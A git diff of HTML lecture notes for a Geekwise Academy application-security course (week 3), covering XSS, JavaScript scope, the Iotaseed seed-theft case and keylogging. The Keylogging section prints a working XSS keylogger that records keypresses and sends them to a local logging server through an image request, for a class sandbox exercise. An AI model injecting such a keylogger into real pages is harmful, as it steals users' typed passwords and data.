@@ -1,156 +1,173 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<head>
+  <head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
     <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ"
+      crossorigin="anonymous">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/vs2015.min.css">
 
     <link rel="stylesheet" href="../common/css/style.css">
-</head>
+  </head>
 
-<body>
+  <body>
     <div class="container">
-        <div class="row">
-            <div class="col">
-                <p class="text-center header-text bold">Application Security and Hardening</p>
-                <p class="text-center header-text">Geekwise Academy</p>
-                <br>
-                <p class="text-center header-subtext italic">Week 3 - Cross-Site Scripting Cont. and Keylogging</p>
-                <br>
-                <p class="text-center header-subtext bold">Instructors:</p>
-                <p class="text-center header-subtext">Corey Shuman</p>
-                <p class="text-center header-subtext ta-name-full"></p>
-                <br>
-                <p class="text-center header-subtext bold">Slack Channel:</p>
-                <p class="text-center header-subtext"><a href="https://geekwise.slack.com/messages/C8SHHJQLU/">#application-security</a></p>
-                <p class="text-center header-subtext bold">Github Repo:</p>
-                <p class="text-center header-subtext"><a href="https://github.com/coreyshuman/GeekwiseApplicationSecurity">https://github.com/coreyshuman/GeekwiseApplicationSecurity</a></p>
-                <p class="text-center header-subtext bold">Lecture Notes:</p>
-                <p class="text-center header-subtext"><a href="http://coreyshuman.github.io/GeekwiseApplicationSecurity/LectureNotes">http://coreyshuman.github.io/GeekwiseApplicationSecurity/LectureNotes</a></p>
-                <hr><br>
-            </div>
+      <div class="row">
+        <div class="col">
+          <p class="text-center header-text bold">Application Security and Hardening</p>
+          <p class="text-center header-text">Geekwise Academy</p>
+          <br>
+          <p class="text-center header-subtext italic">Week 3 - Cross-Site Scripting Cont. and Keylogging</p>
+          <br>
+          <p class="text-center header-subtext bold">Instructors:</p>
+          <p class="text-center header-subtext">Corey Shuman</p>
+          <p class="text-center header-subtext ta-name-full"></p>
+          <br>
+          <p class="text-center header-subtext bold">Slack Channel:</p>
+          <p class="text-center header-subtext"><a href="https://geekwise.slack.com/messages/C8SHHJQLU/">#application-security</a></p>
+          <p class="text-center header-subtext bold">Github Repo:</p>
+          <p class="text-center header-subtext"><a href="https://github.com/coreyshuman/GeekwiseApplicationSecurity">https://github.com/coreyshuman/GeekwiseApplicationSecurity</a></p>
+          <p class="text-center header-subtext bold">Lecture Notes:</p>
+          <p class="text-center header-subtext"><a href="http://coreyshuman.github.io/GeekwiseApplicationSecurity/LectureNotes">http://coreyshuman.github.io/GeekwiseApplicationSecurity/LectureNotes</a></p>
+          <hr><br>
         </div>
-        <div class="row">
-            <div class="col">
-                <p class="header-subtext bold">Table of Contents:</p>
-                <ul id="table-of-contents"></ul>
-                <hr><br>
-            </div>
+      </div>
+      <div class="row">
+        <div class="col">
+          <p class="header-subtext bold">Table of Contents:</p>
+          <ul id="table-of-contents"></ul>
+          <hr><br>
         </div>
-        <div class="row">
-            <div class="col">
-                <h1>Cross-Site Scripting Continued</h1>
-                <h2>XSS Sandbox</h2>
-                <p>The sandbox can be found [HERE](../../Applications/Week-02/02-CrossSiteScriptingSandbox)</p>
-                <p>[Mozilla Web Event Reference](https://developer.mozilla.org/en-US/docs/Web/Events)</p>
+      </div>
+      <div class="row">
+        <div class="col">
+          <h1>Cross-Site Scripting Continued</h1>
+          <h2>XSS Sandbox</h2>
+          <p>The sandbox can be found [HERE](../../Applications/Week-02/02-CrossSiteScriptingSandbox)</p>
+          <p>[Mozilla Web Event Reference](https://developer.mozilla.org/en-US/docs/Web/Events)</p>
 
-                <h1>The Notorious Eval</h1>
-                <p>Notes to come...</p>
+          <h1>The Notorious Eval</h1>
+          <p>Notes to come...</p>
 
-                <h1>Quick Discussion on Scope</h1>
-                <p>Understanding scope in JavaScript in an important a part of being an effective web developer, and it also has influence on the security of our web applications.
-                </p>
-                <p>Look at the two examples below and try to guess what their output will be. <em>Hint:</em> we expect two outputs per example.</p>
-                <pre><code>function corey() {
-    var cts = 22;
-    if(true) {
-        var cts = 'orange';
-        console.log(cts);
-    }
-    console.log(cts);
-}
-corey();</code></pre>
+          <h1>Quick Discussion on Scope</h1>
+          <p>Understanding scope in JavaScript in an important a part of being an effective web developer, and it also has influence
+            on the security of our web applications.
+          </p>
+          <p>Look at the two examples below and try to guess what their output will be. <em>Hint:</em> we expect two outputs
+            per example.</p>
+          <script type='template/code'>
+              function corey() {
+                  var cts = 22;
+                  if(true) {
+                      var cts = 'orange';
+                      console.log(cts);
+                  }
+                  console.log(cts);
+              }
+              corey();
+          </script>
 
-                <pre><code>function corey() {
-    var cts = 22;
-    function shuman() {
-        var cts = 'orange';
-        console.log(cts);
-    }
-    shuman();
-    console.log(cts);
-}
-corey();</code></pre>
+          <script type='template/code'>
+            function corey() {
+              var cts = 22;
+              function shuman() {
+                  var cts = 'orange';
+                  console.log(cts);
+              }
+              shuman();
+              console.log(cts);
+            }
+            corey();
+        </script>
 
-                <p>Scope in JavaScript is defined by functions. Any functions or variables created in the global scope will be attached to the `document` object. Therefore they will be directly accessible by any code (or users!) running in the browser.
-                </p>
-                <p>Try it: copy the above example into your Chrome console then try running the following two commands:</p>
-                <pre><code>corey();</code></pre>
-                <pre><code>shuman();</code></pre>
-                <p>Notice how the `corey()` function is in the global scope, but `shuman()` is scoped within the `corey()` function and is not directly accessible.</p>
-                <h1>Dissecting a Malicious Site</h1>
-                <p>Iotaseed was a website that generated seeds used by Cryptocurrency wallets. Even though they shared their code on github, they managed to sneak some malicious code into their site and track users's seeds. They stole over $4 million from
-                    user's wallets.
-                </p>
-                <p>We will use [this article](https://thatoddmailbox.github.io/2018/01/28/iotaseed.html) to discover exactly how their malicious code worked.</p>
-                <p>[Photo Forensics](https://29a.ch/photo-forensics/#pca)</p>
+          <p>Scope in JavaScript is defined by functions. Any functions or variables created in the global scope will be attached
+            to the `document` object. Therefore they will be directly accessible by any code (or users!) running in the browser.
+          </p>
+          <p>Try it: copy the above example into your Chrome console then try running the following two commands:</p>
+          <pre><code>corey();</code></pre>
+          <pre><code>shuman();</code></pre>
+          <p>Notice how the `corey()` function is in the global scope, but `shuman()` is scoped within the `corey()` function
+            and is not directly accessible.</p>
+          <h1>Dissecting a Malicious Site</h1>
+          <p>Iotaseed was a website that generated seeds used by Cryptocurrency wallets. Even though they shared their code
+            on github, they managed to sneak some malicious code into their site and track users's seeds. They stole over
+            $4 million from user's wallets.
+          </p>
+          <p>We will use [this article](https://thatoddmailbox.github.io/2018/01/28/iotaseed.html) to discover exactly how their
+            malicious code worked.</p>
+          <p>[Photo Forensics](https://29a.ch/photo-forensics/#pca)</p>
 
-                <h1>Keylogging</h1>
-                <p>Let's use the following [Keylogger](https://wiremask.eu/articles/xss-keylogger-turorial/) tutorial to build a keylogger and inject it into our sandbox.</p>
-                <p>Our keylogging code:</p>
-                <pre><code>var buffer = [];
-var attacker = 'http://localhost:3399/?c=';
+          <h1>Keylogging</h1>
+          <p>Let's use the following [Keylogger](https://wiremask.eu/articles/xss-keylogger-turorial/) tutorial to build a keylogger
+            and inject it into our sandbox.</p>
+          <p>Our keylogging code:</p>
+          <script type='template/code'>
+            var buffer = [];
+            var attacker = 'http://localhost:3399/?c=';
 
-document.onkeypress = function(e) {
-    var timestamp = Date.now() | 0;
-    var stroke = {
-        k: e.key,
-        t: timestamp
-    };
-    buffer.push(e.key);
-}
+            document.onkeypress = function(e) {
+                var timestamp = Date.now() | 0;
+                var stroke = {
+                    k: e.key,
+                    t: timestamp
+                };
+                buffer.push(e.key);
+            }
 
-window.setInterval(function() {
-    if (buffer.length > 0) {
-        var data = encodeURIComponent(JSON.stringify(buffer));
-        new Image().src = attacker + data;
-        buffer = [];
-    }
-}, 2000);</code></pre>
-                <p>Our logging server can be found here: [Echo Server](../../Applications/Week-03/02-EchoServer)</p>
-            </div>
+            window.setInterval(function() {
+                if (buffer.length > 0) {
+                    var data = encodeURIComponent(JSON.stringify(buffer));
+                    new Image().src = attacker + data;
+                    buffer = [];
+                }
+            }, 2000);
+          </script>
+          <p>Our logging server can be found here: [Echo Server](../../Applications/Week-03/02-EchoServer)</p>
         </div>
-        <div class="row">
-            <div class="col">
-                <br>
-                <hr>
-                <h1 class="header-subtext bold">Resources</h1>
-                <ul id="resources"></ul>
-            </div>
+      </div>
+      <div class="row">
+        <div class="col">
+          <br>
+          <hr>
+          <h1 class="header-subtext bold">Resources</h1>
+          <ul id="resources"></ul>
         </div>
+      </div>
     </div>
 
     <!--Footer-->
     <br><br>
     <footer class="page-footer">
-        <div style="background-color: #b9b9b9;">
-            <!-- Copyright-->
-            <div class="footer-copyright">
-                <div class="container-fluid text-center">
-                    &copy; 2017 -
-                    <script type="text/javascript">
+      <div style="background-color: #b9b9b9;">
+        <!-- Copyright-->
+        <div class="footer-copyright">
+          <div class="container-fluid text-center">
+            &copy; 2017 -
+            <script type="text/javascript">
                         document.write(new Date().getFullYear());
                     </script>
-                    <a href="https://geekwiseacademy.com">Geekwise Academy</a> &amp; <a href="http://coreyshuman.com">Corey Shuman</a>
-                </div>
-            </div>
-            <!--/.Copyright -->
+            <a href="https://geekwiseacademy.com">Geekwise Academy</a> &amp; <a href="http://coreyshuman.com">Corey Shuman</a>
+          </div>
         </div>
+        <!--/.Copyright -->
+      </div>
     </footer>
     <!--/.Footer-->
 
     <!-- jQuery first, then Tether, then Bootstrap JS. -->
-    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n"
+      crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb"
+      crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn"
+      crossorigin="anonymous"></script>
     <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
     <script src="../common/js/scripts.js"></script>
     <script src="../common/js/ta-name.js"></script>
-</body>
+  </body>
 
 </html>
